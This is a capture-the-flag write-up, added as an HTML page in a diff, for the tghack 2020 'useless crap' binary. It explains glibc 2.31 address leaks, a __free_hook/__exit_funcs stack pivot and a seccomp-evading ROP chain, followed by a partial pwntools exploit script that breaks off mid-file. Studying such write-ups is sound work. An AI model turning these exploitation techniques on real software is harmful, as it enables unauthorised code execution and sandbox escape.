@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <meta name="author" content="Seb" />
+  <meta name="dcterms.date" content="2020-05-01" />
+  <title>tghack 2020</title>
+  <link id="theme" rel="stylesheet" href="/assets/css/dark.css" />
+  <link rel="icon" type="image/png" size="48x48" href="/assets/images/favicon-48x48.png">
+</head>
+<body>
+<table class="header">
+  <tr>
+    <td colspan="2" rowspan="2" class="width-auto">
+      <h1 class="title">tghack 2020</h1>
+      <span class="subtitle"></span>
+    </td>
+    <th>Version</th>
+    <td class="width-min">v1.0.0</td>
+  </tr>
+  <tr>
+    <th>Updated</th>
+    <td class="width-min"><time style="white-space: pre;">2020-05-01</time></td>
+  </tr>
+  <tr>
+    <th class="width-min">Author</th>
+    <td class="width-auto"><a href="/"><cite>Seb</cite></a></td>
+    <td colspan="2" style="text-align: left;" class="width-auto"><a href="/">Home</a></td>
+  </tr>
+</table>
+<label class="theme-toggle-label"><input type="checkbox" class="theme-toggle" /> Theme</label>
+<nav id="TOC" role="doc-toc">
+<h2 id="toc-title">Contents</h2>
+<ul class="incremental">
+<li><a href="#the-challenge" id="toc-the-challenge">The
+challenge</a></li>
+<li><a href="#leaking-every-segment-from-libc"
+id="toc-leaking-every-segment-from-libc">Leaking every segment from
+libc</a>
+<ul class="incremental">
+<li><a href="#text" id="toc-text">.text</a></li>
+<li><a href="#heap" id="toc-heap">heap</a></li>
+<li><a href="#stack" id="toc-stack">stack</a></li>
+</ul></li>
+<li><a href="#libseccomp" id="toc-libseccomp">libseccomp</a></li>
+<li><a href="#solving-the-challenge"
+id="toc-solving-the-challenge">Solving the challenge</a>
+<ul class="incremental">
+<li><a href="#rop-chain" id="toc-rop-chain">ROP chain</a></li>
+<li><a href="#exploit-script" id="toc-exploit-script">exploit
+script</a></li>
+</ul></li>
+</ul>
+</nav>
+<p>This was a fun ctf, even though I spent most of my time on a single
+challenge (called ‘useless crap’). I learned a lot doing this challenge,
+and thought I would make a writeup because as far as I know (from the 2
+places I’ve looked) this is a unique solution to the problem, and has
+some cool tricks.</p>
+<h2 id="the-challenge">The challenge</h2>
+<p>From the challenge page we get 3 files- the binary (called
+<code>crap</code>), a libc (version 2.31) and a dynamic linker/loader
+ld-2.31.so. By running patchelf we see there’s another needed library,
+libseccomp.</p>
+<pre><code>$ patchelf --print-needed ./crap
+libseccomp.so.2
+libc.so.6</code></pre>
+<p>I already had this library in /lib64/, and put a copy in the
+challenge directory. I used patchelf to set all the needed
+libraries/linker in order to run the binary</p>
+<pre><code>$ patchelf --add-needed ./libseccomp.so.2 ./crap
+$ patchelf --add-needed ./libc-2.31.so ./crap
+$ patchelf --set-interpreter ./ld-2.31.so ./crap</code></pre>
+<p>After checking the protections enabled with <code>checksec</code>, it
+looks like this is a 64bit binary with everything enabled:</p>
+<figure>
+<img src="checksec.jpg" alt="checksec" />
+<figcaption aria-hidden="true">checksec</figcaption>
+</figure>
+<p>When we run the binary, we get a simple menu with 3 options</p>
+<pre><code>$ ./crap
+1. read
+2. write
+3. exit
+&gt;</code></pre>
+<p>I then opened up the binary in the <a
+href="https://github.com/radareorg/cutter">cutter</a> disassembler to
+look at what the options do. At this point I found 2 more options,
+accessed by sending ‘4’ and ‘5’. Here is a summary of what each do:</p>
+<ul class="incremental">
+<li>1 read: reads memory at a user supplied address. There is a limit of
+2 reads allowed, enforced by checking if a global signed integer is &gt;
+1</li>
+<li>2 write: writes a user supplied value at a user supplied address.
+Same limit mechanism as read option</li>
+<li>3 exit: Asks the user for some feedback- first some memory is
+allocated with <code>calloc(0x501, 1)</code> then filled with
+<code>fgets</code>. Additionally, after writing their feedback the user
+is asked if they want to keep their feedback. If they answer ‘n’ the
+feedback buffer is <code>free()</code>’d, but <em>not</em> set to NULL.
+You can only provide feedback once- this is enforced by checking if the
+feedback buffer is NULL</li>
+<li>4 view_feedback: calls <code>printf("%s")</code> on the feedback
+buffer</li>
+<li>5 actual <code>exit()</code></li>
+</ul>
+<p>It’s nice that the challenge gives us arbitrary r/w for free, now we
+need some address leaks to work with.</p>
+<p>Because of its size, the allocated feedback chunk is placed into the
+unsorted bin when <code>free()</code>‘d. This means that its forward and
+backward pointers will point inside of <code>main_arena</code> (+96) in
+libc. These pointers are written where the user data used to be in the
+heap chunk, so if we send menu option ’4’ to view the feedback after
+freeing it <code>printf("%s")</code> is called on one of these pointers,
+and so we can read the address of <code>main_arena+96</code> and use
+that to obtain the base of libc.</p>
+<p>There’s a lot you can do with a libc leak + an arbitrary read, like
+leaking the address of every other segment in the process memory.</p>
+<p><br></p>
+<h2 id="leaking-every-segment-from-libc">Leaking every segment from
+libc</h2>
+<h3 id="text">.text</h3>
+<p>If you look at the binary in gdb and run <code>vmmap</code>, you will
+see that the dynamic linker/loader <code>ld</code> program has its own
+segment in memory. The value the .text segment is loaded in at will be
+stored in this segment.</p>
+<p>If you want to check, find the value of the binary base in your gdb
+session using <code>vmmap</code>, then use the search functionality
+(<code>search</code> in pwndbg or <code>search-pattern</code> in gef) to
+search for this value in memory. If found, it will probably be in this
+ld.so section</p>
+<p>What does this mean? The way ASLR is currently implemented (on Linux)
+is the shared libraries are grouped in a single ‘block’, and only the
+start of this block is randomised, not the start of each individual
+shared library. This means the offset from the base of libc to any point
+in the shared library block (which includes the ld.so segment) will be
+constant.</p>
+<p>So all we have to do is calculate the offset from the base of libc to
+the address where the binary base value is stored (in the ld.so segment)
+and read there. We’ve now leaked the .text segment address and defeated
+PIE</p>
+<h3 id="heap">heap</h3>
+<p><code>main_arena</code> will have heap pointers, so you can perform a
+read there to leak a heap address.</p>
+<p>For the ctf challenge, reading at the leak we are given
+(<code>main_arena+96</code>) will give us a heap address.</p>
+<h3 id="stack">stack</h3>
+<p>There is a pointer to the <code>char **envp</code> argument to
+<code>main</code> inside libc. In pwntools, the offset to this can be
+obtained with <code>libc.symbols['environ']</code>. Reading here will
+give us a stack leak, defeating ASLR.</p>
+<p>This stack leak isn’t used in the challenge, but it’s cool to know
+about.</p>
+<p><br></p>
+<h2 id="libseccomp">libseccomp</h2>
+<p>There was another function call in the challenge I haven’t mentioned
+yet- in <code>main</code> there is a call to a function called
+<code>sandbox</code>, which calls some libseccomp functions. If you
+manage to call something like <code>system("/bin/sh")</code> you would
+hit a SIGSYS signal, “bad system call” (I tried it)</p>
+<p><a href="https://github.com/seccomp/libseccomp">libseccomp</a> is an
+API to the kernel’s Berkeley Packet Filter syscall filtering mechanism.
+Basically, it abstracts the filter language away into a function call
+based interface and can be used to do things like whitelist which
+syscalls are allowed and which file descriptions can be read
+from/written to.</p>
+<p><a
+href="https://github.com/david942j/seccomp-tools">seccomp-tools</a> is a
+nice tool that can dump the filter rules for seccomp sandboxes. Running
+it on the challenge binary, we see the following:</p>
+<figure>
+<img src="seccomptools.jpg" alt="seccomptools" />
+<figcaption aria-hidden="true">seccomptools</figcaption>
+</figure>
+<p>The <code>open</code>, <code>close</code>, <code>mprotect</code>, and
+<code>exit_group</code> syscalls are allowed without conditions, while
+<code>read</code> and <code>write</code> have some checks on the file
+descriptor used- specifically, you can only read from fd 0 (stdin) and
+write to fd 0 and 1 (stdin and stdout)</p>
+<p>Trying to execute other syscalls like <code>execve</code> will result
+in a SIGSYS signal stopping the program.</p>
+<h2 id="solving-the-challenge">Solving the challenge</h2>
+<p>After leaking libc by reading the feedback chunk, we use the ‘read’
+option in the menu to read inside the ld.so segment and get a .text
+leak, as described above.</p>
+<p>We can then calculate the address of the integer used for keeping
+track of write counts and use the ‘write’ menu option to set this value
+some negative number, effectively giving us infinite arbitrary writes.
+Now what?</p>
+<p>We <em>could</em> set the feedback buffer pointer to NULL, write over
+<code>__malloc_hook</code>/<code>__free_hook</code> and call the
+set_feedback function again to trigger a
+<code>malloc</code>/<code>free</code> call, but what would we put over
+the hook? A one_gadget wouldn’t work since <code>execve</code> is
+disabled, so it seems like we can’t use this option right now.</p>
+<p>We can get <code>exit()</code> called, and I knew that overwriting
+the <code>__exit_funcs</code> variable in libc did… <em>something</em>
+during <code>exit()</code>. On a whim I went with this to see what would
+happen.</p>
+<p>First lets look at the disassembly for <code>exit()</code> to get an
+idea of what would happen</p>
+<figure>
+<img src="exit.jpg" alt="exit" />
+<figcaption aria-hidden="true">exit</figcaption>
+</figure>
+<p>This loads <code>__exit_funcs</code> as one of the arguments to
+<code>__run_exit_handlers</code> (<a
+href="https://code.woboq.org/userspace/glibc/stdlib/exit.c.html">source</a>),
+which does the actual heavy lifting. <code>__exit_funcs</code> is
+treated as a list of functions to be called, and is normally populated
+by calling functions like <code>atexit()</code>, and by default contains
+a pointer that points to <code>NULL</code>. We can’t use this variable
+to get code execution because of <a
+href="https://sourceware.org/glibc/wiki/PointerEncryption%5D">pointer
+guard</a>, which obfuscates the function pointers used in this
+function.</p>
+<figure>
+<img src="pointerguard.jpg" alt="pointerguard" />
+<figcaption aria-hidden="true">pointerguard</figcaption>
+</figure>
+<p>However, looking at the source code for
+<code>__run_exit_handlers</code> there is a call to <code>free()</code>
+in the function execution loop. We could get code execution using
+<code>__free_hook</code> if we reach this (full disclaimer, I didn’t
+think about using the hooks discussed previously in
+<code>set_feedback</code> during the challenge, so I thought calling
+free from <code>__run_exit_handlers</code> was the only way to reach
+<code>__free_hook</code>, however this turned out to be to my
+benefit).</p>
+<figure>
+<img src="free.jpg" alt="free" />
+<figcaption aria-hidden="true">free</figcaption>
+</figure>
+<p>If we point the <code>__exit_funcs</code> variable to our feedback
+chunk in the heap (which we know the location of because of the heap
+leak) we might have some control over how
+<code>__run_exit_handlers</code> executes. I did this and called
+<code>exit()</code> from the menu</p>
+<p>Some amount of dynamic analysis later I found that if you point
+<code>__exit_funcs</code> to memory containing 8 bytes of arbitrary data
+followed by 8 bytes of zeroes (a NULL ptr) you will hit the call to
+<code>free()</code>, with some particularly interesting values in the
+registers:</p>
+<figure>
+<img src="regs.jpg" alt="regs" />
+<figcaption aria-hidden="true">regs</figcaption>
+</figure>
+<p>Of particular interest is <code>$rbp</code>- it points to the
+<code>__exit_funcs</code> variable in libc (which was set to point to
+our heap chunk, but at some point in <code>__run_exit_handlers</code>
+this was changed- ultimately this doesn’t matter). At this point I
+thought some sort of stack pivot into libc might be possible so I
+searched for gadgets, and managed to find this:</p>
+<figure>
+<img src="gadget.jpg" alt="gadget" />
+<figcaption aria-hidden="true">gadget</figcaption>
+</figure>
+<p>This is the magic gadget that allowed me to solve the challenge-
+<code>$rsp</code> is set above <code>$rbp</code> but we pop 3 times,
+ending up with <code>$rsp</code> pointing to the value right after
+<code>__exit_funcs</code>. This is still in a rw segment and we
+effectively have infinite writes, so we can place a ROP chain here.</p>
+<p>Quick recap on how we got here:</p>
+<ul class="incremental">
+<li>Provide feedback such that we have 8 bytes of arbitrary data
+followed by 8 bytes of zeroes somewhere in the heap chunk- note this
+should be atleast after 0x20 bytes of arbitrary data since
+<code>free()</code> will overwrite some user data</li>
+<li><code>free()</code> the chunk and read the feedback to get a libc
+leak</li>
+<li>Use the libc leak + arbitrary read to leak the .text segment and the
+heap address</li>
+<li>Write over the write count with some large negative number to get
+infinite writes</li>
+<li>Write over <code>__free_hook</code> with our stack pivot gadget</li>
+<li>Write over <code>__exit_funcs</code> with a pointer to our heap
+data</li>
+<li>Call <code>exit()</code> with menu option ‘5’-&gt;
+<code>__run_exit_handlers</code> is called -&gt; <code>free()</code> +
+<code>__free_hook</code> is called-&gt; pivot gadget triggers and we
+<code>ret</code> to whatever address is stored right after
+<code>__exit_funcs</code>.</li>
+</ul>
+<h3 id="rop-chain">ROP chain</h3>
+<p>So we have the ability to return to a ROP chain, but what do we do?
+Looking back at the seccomp rules, we can’t call execve to get a shell.
+We could open the flag file, but its assigned file descriptor won’t be 0
+so we can’t read from it.</p>
+<p>We DO have access to the <code>close</code> syscall however, so we
+can just close fd 0! If we call <code>open</code> after that to open the
+flag file, it will be assigned fd 0, which we can read from according to
+the seccomp rules. After that it’s a simple matter of reading the flag
+into a buffer and writing it to stdout- challenge solved.</p>
+<h3 id="exploit-script">exploit script</h3>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/python3</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> angr, angrop</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> os</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>context.arch <span class="op">=</span> <span class="st">&quot;amd64&quot;</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>c <span class="op">=</span> constants</span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>PROGNAME <span class="op">=</span> <span class="st">&quot;./crap&quot;</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a><span class="co"># didnt get it working remotely</span></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>REMOTE <span class="op">=</span> <span class="st">&quot;crap.tghack.no&quot;</span></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>REMOTEPORT <span class="op">=</span> <span class="dv">6001</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> args.REMOTE:</span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>    p <span class="op">=</span> remote(REMOTE, REMOTEPORT)</span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a><span class="cf">else</span>:</span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>    p <span class="op">=</span> process(PROGNAME)</span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>e <span class="op">=</span> ELF(PROGNAME)</span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a>libc <span class="op">=</span> e.libc</span>
+<span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a><span class="co">########## Helper functions ##############</span></span>
+<span id="cb4-23"><a href="#cb4-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-24"><a href="#cb4-24" aria-hidden="true" tabindex="-1"></a><span class="co"># generates our ROP chain</span></span>
+<span id="cb4-25"><a href="#cb4-25" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> get_chain(path_buf, flag_buf, base):</span>
+<span id="cb4-26"><a href="#cb4-26" aria-hidden="true" tabindex="-1"></a>    r <span class="op">=</span> angr.Project(<span class="st">&quot;./libc-2.31.so&quot;</span>)</span>
+<span id="cb4-27"><a href="#cb4-27" aria-hidden="true" tabindex="-1"></a>    rop <span class="op">=</span> r.analyses.ROP()</span>
+<span id="cb4-28"><a href="#cb4-28" aria-hidden="true" tabindex="-1"></a>    gadget_file <span class="op">=</span> <span class="st">&quot;.gadgets-crap&quot;</span></span>
+<span id="cb4-29"><a href="#cb4-29" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> os.path.isfile(gadget_file):</span>
+<span id="cb4-30"><a href="#cb4-30" aria-hidden="true" tabindex="-1"></a>        rop.load_gadgets(gadget_file)</span>
+<span id="cb4-31"><a href="#cb4-31" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
+<span id="cb4-32"><a href="#cb4-32" aria-hidden="true" tabindex="-1"></a>        <span class="cf">with</span> <span class="bu">open</span>(gadget_file, <span class="st">&quot;wb+&quot;</span>):</span>
+<span id="cb4-33"><a href="#cb4-33" aria-hidden="true" tabindex="-1"></a>            <span class="cf">pass</span></span>
+<span id="cb4-34"><a href="#cb4-34" aria-hidden="true" tabindex="-1"></a>        rop.find_gadgets()</span>
+<span id="cb4-35"><a href="#cb4-35" aria-hidden="true" tabindex="-1"></a>        rop.save_gadgets(gadget_file)</span>
+<span id="cb4-36"><a href="#cb4-36" aria-hidden="true" tabindex="-1"></a>    <span class="co"># reference: https://github.com/salls/angrop</span></span>
+<span id="cb4-37"><a href="#cb4-37" aria-hidden="true" tabindex="-1"></a>    chain <span class="op">=</span> rop.write_to_mem(path_buf, <span class="st">b&quot;/flag</span><span class="ch">\x00</span><span class="st">&quot;</span>)</span>
+<span id="cb4-38"><a href="#cb4-38" aria-hidden="true" tabindex="-1"></a>    chain <span class="op">+=</span> rop.do_syscall(<span class="dv">3</span>, [<span class="dv">0</span>])                         <span class="co"># close fd 0</span></span>
+<span id="cb4-39"><a href="#cb4-39" aria-hidden="true" tabindex="-1"></a>    chain <span class="op">+=</span> rop.do_syscall(<span class="dv">2</span>, [path_buf, os.O_RDONLY, <span class="dv">0</span>])  <span class="co"># open flag-&gt;fd 0</span></span>
+<span id="cb4-40"><a href="#cb4-40" aria-hidden="true" tabindex="-1"></a>    chain <span class="op">+=</span> rop.do_syscall(<span class="dv">0</span>, [<span class="dv">0</span>, flag_buf, <span class="bn">0x100</span>])        <span class="co"># read-&gt;flag_buf</span></span>
+<span id="cb4-41"><a href="#cb4-41" aria-hidden="true" tabindex="-1"></a>    chain <span class="op">+=</span> rop.do_syscall(<span class="dv">1</span>, [<span class="dv">1</span>, flag_buf, <span class="bn">0x100</span>])        <span class="co"># write flag_buf-&gt;stdout</span></span>
+<span id="cb4-42"><a href="#cb4-42" aria-hidden="true" tabindex="-1"></a>    <span class="co">#print(chain.print_payload_code())</span></span>
+<span id="cb4-43"><a href="#cb4-43" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> chain.payload_str(base_addr<span class="op">=</span>base)</span>
+<span id="cb4-44"><a href="#cb4-44" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-45"><a href="#cb4-45" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> menu():</span>
+<span id="cb4-46"><a href="#cb4-46" aria-hidden="true" tabindex="-1"></a>    p.recvuntil(<span class="st">&#39;&gt;&#39;</span>)</span>
+<span id="cb4-47"><a href="#cb4-47" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> get_leak(payload):</span>
+<span id="cb4-48"><a href="#cb4-48" aria-hidden="true" tabindex="-1"></a>    p.sendline(<span class="st">&#39;3&#39;</span>)</span>
+<span id="cb4-49"><a href="#cb4-49" aria-hidden="true" tabindex="-1"></a>    p.sendlineafter(<span class="st">&quot;feedback: &quot;</span>, payload)</span>
+<span id="cb4-50"><a href="#cb4-50" aria-hidden="true" tabindex="-1"></a>    p.sendlineafter(<span class="st">&#39;(y/n)&#39;</span>, <span class="st">&#39;n&#39;</span>)</span>
+<span id="cb4-51"><a href="#cb4-51" aria-hidden="true" tabindex="-1"></a>    menu()</span>
+<span id="cb4-52"><a href="#cb4-52" aria-hidden="true" tabindex="-1"></a>    p.sendline(<span class="st">&#39;4&#39;</span>)</span>
+<span id="cb4-53"><a href="#cb4-53" aria-hidden="true" tabindex="-1"></a>    p.recvuntil(<span class="st">&#39;feedback: &#39;</span>)</span>
+<span id="cb4-54"><a href="#cb4-54" aria-hidden="true" tabindex="-1"></a>    leak <span class="op">=</span> p.recvline()[:<span class="op">-</span><span class="dv">1</span>] <span class="co"># trim /n</span></span>
+<span id="cb4-55"><a href="#cb4-55" aria-hidden="true" tabindex="-1"></a>    diff <span class="op">=</span> <span class="dv">8</span> <span class="op">-</span> <span class="bu">len</span>(leak)</span>
+<span id="cb4-56"><a href="#cb4-56" aria-hidden="true" tabindex="-1"></a>    leak <span class="op">+=</span> <span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span><span class="op">*</span>diff    <span class="co"># pad to 8 bytes</span></span>
+<span id="cb4-57"><a href="#cb4-57" aria-hidden="true" tabindex="-1"></a>    menu()</span>
+<span id="cb4-58"><a href="#cb4-58" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> u64(leak)</span>
+<span id="cb4-59"><a href="#cb4-59" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> write_addr(where, what):</span>
+<span id="cb4-60"><a href="#cb4-60" aria-hidden="true" tabindex="-1"></a>    p.sendline(<span class="st">&#39;2&#39;</span>)</span>
+<span id="cb4-61"><a href="#cb4-61" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">=</span> where <span class="op">+</span> <span class="st">&quot; &quot;</span> <span class="op">+</span> what</span>
+<span id="cb4-62"><a href="#cb4-62" aria-hidden="true" tabindex="-1"></a>    p.sendlineafter(<span class="st">&#39;value:&#39;</span>, payload)</span>
+<span id="cb4-63"><a href="#cb4-63" aria-hidden="true" tabindex="-1"></a>    menu()</span>
+<span id="cb4-64"><a href="#cb4-64" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> read_addr(addr):</span>
+<span id="cb4-65"><a href="#cb4-65" aria-hidden="true" tabindex="-1"></a>    p.sendline(<span class="st">&#39;1&#39;</span>)</span>
+<span id="cb4-66"><a href="#cb4-66" aria-hidden="true" tabindex="-1"></a>    p.sendlineafter(<span class="st">&#39;addr: &#39;</span>, addr)</span>
+<span id="cb4-67"><a href="#cb4-67" aria-hidden="true" tabindex="-1"></a>    p.recvuntil(<span class="st">&#39;0x&#39;</span>, drop<span class="op">=</span><span class="va">True</span>)</span>
+<span id="cb4-68"><a href="#cb4-68" aria-hidden="true" tabindex="-1"></a>    ret <span class="op">=</span> <span class="bu">int</span>(p.recvline(), <span class="dv">16</span>)</span>
+<span id="cb4-69"><a href="#cb4-69" aria-hidden="true" tabindex="-1"></a>    menu()</span>
+<span id="cb4-70"><a href="#cb4-70" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> ret</span>
+<span id="cb4-71"><a href="#cb4-71" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-72"><a href="#cb4-72" aria-hidden="true" tabindex="-1"></a><span class="co"># assume we have enough writes</span></span>
+<span id="cb4-73"><a href="#cb4-73" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> write_block(where, what):</span>
+<span id="cb4-74"><a href="#cb4-74" aria-hidden="true" tabindex="-1"></a>    <span class="co"># split payload into 8 bytes chunks</span></span>
+<span id="cb4-75"><a href="#cb4-75" aria-hidden="true" tabindex="-1"></a>    n <span class="op">=</span> <span class="dv">8</span></span>
+<span id="cb4-76"><a href="#cb4-76" aria-hidden="true" tabindex="-1"></a>    chunk_list <span class="op">=</span> [ what[i:i<span class="op">+</span>n] <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">0</span>, <span class="bu">len</span>(what), n) ]</span>
+<span id="cb4-77"><a href="#cb4-77" aria-hidden="true" tabindex="-1"></a>    cur_where <span class="op">=</span> where</span>
+<span id="cb4-78"><a href="#cb4-78" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> c <span class="kw">in</span> chunk_list:</span>
+<span id="cb4-79"><a href="#cb4-79" aria-hidden="true" tabindex="-1"></a>        p.sendline(<span class="st">&#39;2&#39;</span>)</span>
+<span id="cb4-80"><a href="#cb4-80" aria-hidden="true" tabindex="-1"></a>        diff <span class="op">=</span> <span class="dv">8</span> <span class="op">-</span> <span class="bu">len</span>(c)</span>
+<span id="cb4-81"><a href="#cb4-81" aria-hidden="true" tabindex="-1"></a>        c <span class="op">=</span> <span class="st">b&quot;</span><span class="ch">\x00</span><span class="st">&quot;</span><span class="op">*</span>diff <span class="op">+</span> c</span>
+<span id="cb4-82"><a href="#cb4-82" aria-hidden="true" tabindex="-1"></a>        payload <span class="op">=</span> <span class="bu">hex</span>(cur_where) <span class="op">+</span> <span class="st">&quot; &quot;</span> <span class="op">+</span> <span class="bu">hex</span>(u64(c))</span>
+<span id="cb4-83"><a href="#cb4-83" aria-hidden="true" tabindex="-1"></a>        p.sendlineafter(<span class="st">&#39;value:&#39;</span>, payload)</span>
+<span id="cb4-84"><a href="#cb4-84" aria-hidden="true" tabindex="-1"></a>        menu()</span>
+<span id="cb4-85"><a href="#cb4-85" aria-hidden="true" tabindex="-1"></a>        cur_where <span class="op">+=</span> <span class="bn">0x8</span></span>
+<span id="cb4-86"><a href="#cb4-86" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-87"><a href="#cb4-87" aria-hidden="true" tabindex="-1"></a><span class="co">########## Solution #############</span></span>
+<span id="cb4-88"><a href="#cb4-88" aria-hidden="true" tabindex="-1"></a>menu()</span>
+<span id="cb4-89"><a href="#cb4-89" aria-hidden="true" tabindex="-1"></a><span class="co"># leak is at main_arena+96, diff of 0x3b5be0 from base of libc</span></span>
+<span id="cb4-90"><a href="#cb4-90" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span><span class="op">*</span><span class="bn">0x20</span> <span class="op">+</span> <span class="st">b&#39;A&#39;</span><span class="op">*</span><span class="dv">8</span> <span class="op">+</span> <span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span><span class="op">*</span><span class="dv">8</span></span>
+<span id="cb4-91"><a href="#cb4-91" aria-hidden="true" tabindex="-1"></a>leak <span class="op">=</span> get_leak(payload)</span>
+<span id="cb4-92"><a href="#cb4-92" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;leaked 0x</span><span class="sc">%x</span><span class="st">&#39;</span> <span class="op">%</span> leak)</span>
+<span id="cb4-93"><a href="#cb4-93" aria-hidden="true" tabindex="-1"></a>libc.address <span class="op">=</span> leak <span class="op">-</span> <span class="bn">0x3b5be0</span></span>
+<span id="cb4-94"><a href="#cb4-94" aria-hidden="true" tabindex="-1"></a>free_hook <span class="op">=</span> libc.symbols[<span class="st">&#39;__free_hook&#39;</span>]</span>
+<span id="cb4-95"><a href="#cb4-95" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-96"><a href="#cb4-96" aria-hidden="true" tabindex="-1"></a><span class="co"># get heap leak by reading main arena leak</span></span>
+<span id="cb4-97"><a href="#cb4-97" aria-hidden="true" tabindex="-1"></a>heap_leak <span class="op">=</span> read_addr(<span class="bu">hex</span>(leak))</span>
+<span id="cb4-98"><a href="#cb4-98" aria-hidden="true" tabindex="-1"></a>input_addr <span class="op">=</span> heap_leak <span class="op">-</span> <span class="bn">0x1240</span>       <span class="co"># offset in chunk to user data</span></span>
+<span id="cb4-99"><a href="#cb4-99" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-100"><a href="#cb4-100" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-101"><a href="#cb4-101" aria-hidden="true" tabindex="-1"></a><span class="co"># binary base in linker at main_arena leak + 0x22e900</span></span>
+<span id="cb4-102"><a href="#cb4-102" aria-hidden="true" tabindex="-1"></a>bin_base <span class="op">=</span> read_addr(<span class="bu">hex</span>(leak<span class="op">+</span><span class="bn">0x22e900</span>))</span>
+<span id="cb4-103"><a href="#cb4-103" aria-hidden="true" tabindex="-1"></a>e.address <span class="op">=</span> bin_base</span>
+<span id="cb4-104"><a href="#cb4-104" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&quot;binary base at 0x</span><span class="sc">%x</span><span class="st">&quot;</span> <span class="op">%</span> e.address)</span>
+<span id="cb4-105"><a href="#cb4-105" aria-hidden="true" tabindex="-1"></a>review <span class="op">=</span> e.address <span class="op">+</span> <span class="bn">0x202038</span></span>
+<span id="cb4-106"><a href="#cb4-106" aria-hidden="true" tabindex="-1"></a>write_count <span class="op">=</span> e.address <span class="op">+</span> <span class="bn">0x202034</span></span>
+<span id="cb4-107"><a href="#cb4-107" aria-hidden="true" tabindex="-1"></a>read_count <span class="op">=</span> e.address <span class="op">+</span> <span class="dv">202030</span></span>
+<span id="cb4-108"><a href="#cb4-108" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-109"><a href="#cb4-109" aria-hidden="true" tabindex="-1"></a><span class="co"># some writable part of memory to put flag path/contents</span></span>
+<span id="cb4-110"><a href="#cb4-110" aria-hidden="true" tabindex="-1"></a>buf_target <span class="op">=</span> e.address <span class="op">+</span> <span class="bn">0x202050</span></span>
+<span id="cb4-111"><a href="#cb4-111" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-112"><a href="#cb4-112" aria-hidden="true" tabindex="-1"></a>write_addr(<span class="bu">hex</span>(write_count), <span class="st">&quot;-0x500&quot;</span>)      <span class="co"># get more writes</span></span>
+<span id="cb4-113"><a href="#cb4-113" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-114"><a href="#cb4-114" aria-hidden="true" tabindex="-1"></a><span class="co"># mov rsp, rbx; lea rsp, [rbp - 0x10]; pop rbx; pop r12; pop rbp; ret;</span></span>
+<span id="cb4-115"><a href="#cb4-115" aria-hidden="true" tabindex="-1"></a>pivot_gadget <span class="op">=</span> libc.address <span class="op">+</span> <span class="bn">0xc536b</span></span>
